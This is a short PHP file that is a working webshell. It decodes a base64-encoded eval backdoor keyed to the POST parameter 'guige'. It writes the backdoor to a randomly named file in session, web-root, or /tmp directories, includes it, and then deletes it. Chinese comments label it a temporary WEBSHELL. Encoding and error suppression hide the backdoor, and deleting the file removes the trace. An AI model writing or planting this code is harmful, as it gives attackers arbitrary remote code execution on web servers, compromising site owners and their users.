<?php

    $cfg_ml='PD9waHAgQGV2YWwoJF9QT1NUWydndWlnZSddKT8+';
    //<?php @eval($_POST['guige'])?>

    $cfg_ml = base64_decode($cfg_ml);
    $t = md5(mt_rand(1,100));
    //尝试向各种可能的目录下写入临时WEBSHELL文件
    $f=$_SERVER['DOCUMENT_ROOT'].'/data/sessions/sess_'.$t;
    @file_put_contents($f,$cfg_ml);
    if(!file_exists($f))
    {    
        $f=$t;
        @file_put_contents($f,$cfg_ml);
    }
    if(!file_exists($f))
    {
        $f=$_SERVER['DOCUMENT_ROOT'].'/a/'.$t;
        @file_put_contents($f,$cfg_ml);
    }
    if(!file_exists($f))
    {
        //向脚本所在当前目录下写入临时WEBSHELL文件
        $f=$_SERVER['DOCUMENT_ROOT'].'/'.$t;
        @file_put_contents($f,$cfg_ml);
    }
    if(!file_exists($f))
    {
        $f='/tmp/'.$t;
        @file_put_contents($f,$cfg_ml);
    } 
    //通过include引入之前写入的临时WEBSHELL文件
    @include($f);
    @unlink($f);  

?>